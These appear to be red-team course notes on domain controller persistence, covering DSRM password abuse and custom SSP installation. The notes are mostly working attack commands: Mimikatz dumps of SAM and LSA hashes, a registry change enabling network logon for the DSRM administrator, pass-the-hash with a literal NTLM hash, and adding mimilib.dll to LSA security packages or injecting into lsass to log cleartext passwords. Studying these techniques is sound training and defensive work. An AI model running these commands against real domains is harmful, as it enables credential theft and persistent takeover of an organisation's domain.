# Directory Services Restore Mode (DSRM)

• DSRM is Directory Services Restore Mode.

• There is a local administrator on every DC called "Administrator" whose password is the DSRM password.

• DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed.

• After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.

![image](https://user-images.githubusercontent.com/40224197/211095052-9635bbf3-b88e-4c08-8c38-049ebfb8a9eb.png)

#### Dump DSRM password (needs DA privs)
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc
```

#### Compare the Administrator hash with the Administrator hash of below command
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
```

### First one is the DSRM Local Administrator

#### Since it is the local administrator of the DC, we can pass the hash to authenticate. But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash
```powershell
Enter-PSSession -Computername dcorp-dc
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

#### Use below command to pass the hash
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorpdc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'

ls \\dcorp-dc\C$
```

# Learning Objective 11

Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.

# Custome SSP

• A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP Packages by Microsoft are:

– NTLM

– Kerberos

– Wdigest

– CredSSP

• Mimikatz provides a custom SSP - mimilib.dll. This SSP logs local logons, service account and machine account passwords in clear text on the target server.

We can use either of the ways:

– Drop the mimilib.dll to system32 and add mimilib to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`:
```powershell
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages' $packages += "mimilib" Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages 
```

– Using mimikatz, inject into lsass (Not stable with Server 2016):
```powershell
Invoke-Mimikatz -Command '"misc::memssp"'
```

All local logons on the DC are logged to `C:\Windows\system32\kiwissp.log`
![image](https://user-images.githubusercontent.com/40224197/211097007-f511e6dc-beaf-4112-8308-9bf444315d23.png)
